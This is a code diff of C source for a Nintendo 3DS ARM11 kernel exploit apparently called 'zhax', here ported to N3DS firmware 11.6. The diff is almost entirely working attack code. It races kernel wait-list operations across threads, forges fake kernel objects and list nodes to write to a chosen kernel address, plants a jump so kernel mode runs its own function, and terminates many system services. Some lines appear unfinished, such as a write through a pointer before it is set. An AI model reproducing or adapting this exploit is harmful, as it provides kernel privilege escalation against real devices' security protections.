@@ -10,6 +10,7 @@
 #include "ns.h"
 
 Handle wait_handles[256] = {0};
+Handle wait_handles_2[256] = {0};
 const int num_waits = sizeof(wait_handles) / sizeof(wait_handles[0]);
 
 u32* test_buf = (u32*)0x0dea0000;
@@ -20,10 +21,7 @@ vu32 stop_loop = 0;
 
 u8* bottom_fb = NULL;
 
-u32 corruption_target = 0xdff80000 + 0x638;
-// u32 corruption_initial_val = 0xFFF020B4; // N9.2
-u32 corruption_initial_val = 0xFFF018B4; // N9.2 - 3dshax
-u32 ll_node_kobj_pool_ptr = 0xFFF31460; // N9.2
+u32 corruption_target = 0xdff80000 + 0x6C68C + 0x24; // N3DS 11.6 (VA: 0xFFF2E68C + 0x24)
 
 vu32 val_objptr = 0;
 vu32 val_next = 0;
@@ -33,11 +31,11 @@ Handle wait_thread_handles[16] = {0};
 #define num_wait_threads (sizeof(wait_thread_handles) / sizeof(wait_thread_handles[0]))
 void* wait_thread_stacks[num_wait_threads];
 
-void wait_thread()
+void wait_thread(u32 wait_thread_id)
 {
 	s32 out = 0;
 
-	svcWaitSynchronizationN(&out, wait_handles, num_waits, false, 0x0FFFFFFFFFFFFFFFll);
+	svcWaitSynchronizationN(&out, wait_thread_id ? wait_handles : wait_handles_2, num_waits, false, 0x0FFFFFFFFFFFFFFFll);
 
 	svcExitThread();
 }
@@ -47,28 +45,26 @@ void ktest()
 	// wait for other thread to be ready
 	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);
 
-	// printf("%08X\n", (unsigned int)_cpsr());
-
 	// go exploit stuff
 	{
-		// printf("test %08X\n", *(unsigned int*)0x00000000);
-		// printf("sup?\n");
-
 		svcSleepThread(1 * 1000 * 1000);
 
 		Handle wait_obj = 0;
+		Handle wait_obj_2 = 0;
 
-		// svcCreatewait_obj(&wait_obj, true);
-		svcCreateTimer(&wait_obj, 2);
+		svcCreateEvent(&wait_obj, 0);
+		svcCreateEvent(&wait_obj_2, 0);
 
 		int i;
-		for(i = 0; i < num_waits; i++) wait_handles[i] = wait_obj;
+		for(i = 0; i < num_waits; i++)
+		{
+			wait_handles[i] = wait_obj;
+			wait_handles_2[i] = wait_obj_2;
+		}
 
 		for(i = 0; i < num_wait_threads; i++)
 		{
-			svcCreateThread(&wait_thread_handles[i], wait_thread, 0, wait_thread_stacks[i], 0x19, 1);
-
-			// printf("thread %02d %08X %08X %08X\n", i, (unsigned int)wait_thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);
+			svcCreateThread(&wait_thread_handles[i], (void*)wait_thread, i, wait_thread_stacks[i], 0x19, 1);
 
 			svcSleepThread(1 * 1000 * 1000);
 
@@ -76,7 +72,7 @@ void ktest()
 		}
 	}
 
-	// printf("ktest done\n");
+	while(1);
 
 	svcExitThread();
 }
@@ -88,107 +84,80 @@ void hello()
 		"cpsid i"
 	);
 
-	stop_loop = 1;
-
-	// fix up exception vector
-	*(u32*)corruption_target = corruption_initial_val;
-	flush_dcache();
-
-	memset(bottom_fb, 0x00, 240 * 320 * 3);
+	memset(bottom_fb, 0xda, 240 * 320 * 3);
 
 	drawString(bottom_fb, "hello from arm11 kernel", 10, 10);
 	flush_dcache();
 
-	// restore ll_node_kobj_pool
-	const u32 buffer_size = 0x10000;
-	u8* buffer = linearMemAlign(buffer_size, 0x10);
-	u32 buffer_kva = (u32)buffer;
-	if(buffer_kva >= 0x30000000) buffer_kva += 0xE0000000 - 0x30000000;
-	else buffer_kva += 0xE0000000 - 0x14000000;
-
-	int i;
-	for(i = 0; i < buffer_size; i += 0xC) *(u32*)&buffer[i] = buffer_kva + i + 0xC;
-
-	*(vu32*)ll_node_kobj_pool_ptr = buffer_kva;
-
-	done = 1;
-
-	drawString(bottom_fb, "hello from arm11 kernel again", 10, 20);
-	drawHex(bottom_fb, val_next, 10, 30);
-	flush_dcache();
-
-	// restore corrupted linked list
-	u32* cur = (u32*)val_next;
-	while(*cur != 0) cur = (u32*) *cur;
-	*cur = val_next;
-
-	drawString(bottom_fb, "hello from arm11 kernel again again", 10, 40);
-	drawHex(bottom_fb, (u32)cur, 10, 50);
-	flush_dcache();
-
-	u32 rfe_data[] = {(u32)&return_to_usermode, 0x10, 0xbeefdad, 0xbabeddad, 0xdeaddad, 0xbeefbabe, 0xcafedead};
-
-	_rfe(rfe_data);
-
 	while(1);
 }
 
+u32 kobj_buffer_kva, kobj_2_buffer_kva;
+u32 val_nextptr = 0xdeadbabe;
+
 void speedracer()
 {
-	*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
-
-	// write a jmp instruction!
-	*(vu32*)&test_buf_mirror[0x3] = 0xE51FF004; // ldr pc, [pc, #-4]
-	*(vu32*)&test_buf_mirror[0x4] = (u32)&hello; // pc
+	*(vu32*)&test_buf_mirror[0x0] = 0;
 
 	while(1)
 	{
-		val_objptr = *(vu32*)&test_buf_mirror[0x2];
+		val_nextptr = *(vu32*)&test_buf_mirror[0x0];
 
-		if(val_objptr != 0xdadadada)
+		if(val_nextptr != 0)
 		{
-			break;
-		}
-	}
-	
-	while(1)
-	{
-		val_next = *(vu32*)&test_buf_mirror[0x0];
+			val_objptr = *(vu32*)&test_buf_mirror[0x2];
+		
+			// let the other thread know that it can stop
+			stop_loop = 1;
 
-		// shouldn't this condition always be true since we set this to 0x40 at the top?
-		if(val_next && val_next != 0xdadadada)
-		{
+			// signal one of the events such that a bunch of kernel list nodes get freed and only one list uses the null node
+			svcSignalEvent(wait_handles_2[0]);
 			break;
 		}
 	}
 
-	// while(1)
-	// {
-		val_prev = *(vu32*)&test_buf_mirror[0x1];
+	// wait for the null-node list insertion and such to happen
+	svcSleepThread(1 * 1000 * 1000);
 
-	// 	if(val_prev && val_prev != 0xdadadada)
-	// 	{
-	// 		break;
-	// 	}
-	// }
+	// place fake kobjects at an address which is also a non-destructive instruction
+	kobj_buffer_kva = 0x00000800;
+	*(u8*)(kobj_2_buffer_kva + 0x34) = 0x0;
+	kobj_2_buffer_kva = 0x00000C00;
+	*(u8*)(kobj_2_buffer_kva + 0x34) = 0x1;
 
-	// *(vu32*)0xdead0000 = val_next;
+	// first node: use kobj so that it doesn't get unlinked (and avoid a kernel panic because this is the null-node)
+	// *(vu32*)&test_buf_mirror[0x00] = val_nextptr;
+	*(vu32*)&test_buf_mirror[0x00] = 0x00000040;
+	*(vu32*)&test_buf_mirror[0x01] = 0xc0c0c0c0;
+	*(vu32*)&test_buf_mirror[0x02] = kobj_buffer_kva;
 
-	while(!done)
-	{
-		*(vu32*)&test_buf_mirror[0x0] = 0x00000040;
-		*(vu32*)&test_buf_mirror[0x1] = corruption_target; // exception vector
-		*(vu32*)&test_buf_mirror[0x2] = 0xb0b0b0b0;
-		*(vu32*)&test_buf_mirror[0x10] = corruption_target; // exception vector
-		// *(vu32*)&test_buf_mirror[0x11] = 0xd0d0d0d0;
-		*(vu32*)&test_buf_mirror[0x12] = val_objptr; // kthread
-	}
+	// second node: write 0x80 to corruption_target
+	*(vu32*)&test_buf_mirror[0x10] = 0x00000080;
+	*(vu32*)&test_buf_mirror[0x11] = corruption_target;
+	*(vu32*)&test_buf_mirror[0x12] = kobj_2_buffer_kva;
 
-	*(vu32*)&test_buf_mirror[0x0] = val_next;
-	*(vu32*)&test_buf_mirror[0x1] = val_prev;
-	*(vu32*)&test_buf_mirror[0x2] = val_objptr;
+	// third node: skip such that next node doesn't get modified, then basically a nopseld followed by a "b hello"
+	*(vu32*)&test_buf_mirror[0x20] = 0xE59FF000; // ldr pc, [pc]
+	*(vu32*)&test_buf_mirror[0x21] = 0xdeadbabe; // will get overwritten with corruption_target so we ignore it
+	*(vu32*)&test_buf_mirror[0x22] = (u32)&hello; // pc
 
-	// svcExitThread();
+	// // fourth node: skip and link to end of list
+	// *(vu32*)&test_buf_mirror[0x30] = val_nextptr;
+	// *(vu32*)&test_buf_mirror[0x31] = 0xc0c0c0c0;
+	// *(vu32*)&test_buf_mirror[0x32] = kobj_buffer_kva;
+
+    // while(*(vu32*)(0x10146000 + 0x80000000) != 0xFFE); // A
+
+    printf("done\n");
+
+	svcSignalEvent(wait_handles[0]);
+    
+    printf("done again!\n");
+
+	// NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
+	// svcExitProcess();
+
+	while(1) svcSleepThread(1 * 1000 * 1000);
 }
 
 Result zhax()
@@ -233,26 +202,28 @@ Result zhax()
 			NS_TerminateTitle(0x4013000002602ll, 1 * 1000 * 1000); // cecd    ; 0x1d
 			NS_TerminateTitle(0x4013000002f02ll, 1 * 1000 * 1000); // ssl     ; 0x1c
 			NS_TerminateTitle(0x4013000002902ll, 1 * 1000 * 1000); // http    ; 0x1b
+
 			NS_TerminateTitle(0x4013000002e02ll, 1 * 1000 * 1000); // socket  ; 0x1a
-			NS_TerminateTitle(0x4013000002d02ll, 1 * 1000 * 1000); // nwm     ; 0x19
+			// NS_TerminateTitle(0x4013000002d02ll, 1 * 1000 * 1000); // nwm     ; 0x19
 			NS_TerminateTitle(0x4013000003302ll, 1 * 1000 * 1000); // ir      ; 0x18
 			NS_TerminateTitle(0x4013000002002ll, 1 * 1000 * 1000); // mic     ; 0x17
 			NS_TerminateTitle(0x4013000001602ll, 1 * 1000 * 1000); // camera  ; 0x16
 			NS_TerminateTitle(0x4013000002702ll, 1 * 1000 * 1000); // csnd    ; 0x15
-			NS_TerminateTitle(0x4013000001c02ll, 1 * 1000 * 1000); // gsp     ; 0x14
-			NS_TerminateTitle(0x4013000001502ll, 1 * 1000 * 1000); // am      ; 0x13
+			// NS_TerminateTitle(0x4013000001c02ll, 1 * 1000 * 1000); // gsp     ; 0x14
+			// NS_TerminateTitle(0x4013000001502ll, 1 * 1000 * 1000); // am      ; 0x13
 			NS_TerminateTitle(0x4013000001a02ll, 1 * 1000 * 1000); // dsp     ; 0x12
 			NS_TerminateTitle(0x4013000001802ll, 1 * 1000 * 1000); // codec   ; 0x11
 			NS_TerminateTitle(0x4013000001d02ll, 1 * 1000 * 1000); // hid     ; 0x10
 			NS_TerminateTitle(0x4003000008a02ll, 1 * 1000 * 1000); // ErrDisp ; 0x0e
-			NS_TerminateTitle(0x4013000003102ll, 1 * 1000 * 1000); // ps      ; 0x0d
-			NS_TerminateTitle(0x4013000002302ll, 1 * 1000 * 1000); // spi     ; 0x0c
-			NS_TerminateTitle(0x4013000002102ll, 1 * 1000 * 1000); // pdn     ; 0x0b
-			NS_TerminateTitle(0x4013000001f02ll, 1 * 1000 * 1000); // mcu     ; 0x0a
-			NS_TerminateTitle(0x4013000001e02ll, 1 * 1000 * 1000); // i2c     ; 0x09
-			NS_TerminateTitle(0x4013000001b02ll, 1 * 1000 * 1000); // gpio    ; 0x08
-			NS_TerminateTitle(0x4013000001702ll, 1 * 1000 * 1000); // cfg     ; 0x07
-			NS_TerminateTitle(0x4013000002202ll, 1 * 1000 * 1000); // ptm     ; 0x06
+
+			// NS_TerminateTitle(0x4013000003102ll, 1 * 1000 * 1000); // ps      ; 0x0d
+			// NS_TerminateTitle(0x4013000002302ll, 1 * 1000 * 1000); // spi     ; 0x0c
+			// NS_TerminateTitle(0x4013000002102ll, 1 * 1000 * 1000); // pdn     ; 0x0b
+			// NS_TerminateTitle(0x4013000001f02ll, 1 * 1000 * 1000); // mcu     ; 0x0a
+			// NS_TerminateTitle(0x4013000001e02ll, 1 * 1000 * 1000); // i2c     ; 0x09
+			// NS_TerminateTitle(0x4013000001b02ll, 1 * 1000 * 1000); // gpio    ; 0x08
+			// NS_TerminateTitle(0x4013000001702ll, 1 * 1000 * 1000); // cfg     ; 0x07
+			// NS_TerminateTitle(0x4013000002202ll, 1 * 1000 * 1000); // ptm     ; 0x06
 
 
 			// need to do menu second to last because killing it kills our ns:s handle
@@ -263,12 +234,17 @@ Result zhax()
 			// NS_TerminateTitle(0x4013000008002ll, 1 * 1000 * 1000); // ns      ; 0x05
 
 		Handle thread = 0;
-		
 		ret = svcCreateThread(&thread, ktest, 0, (u32*)(stack + stack_len), 0x20, 1);
 
 		printf("hi\n");
 
+		// // firmlaunch
+		// NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
+		// // svcExitProcess();
+
 		speedracer();
+
+		while(1);
 
 		while(1) printf("done\n");
 	}
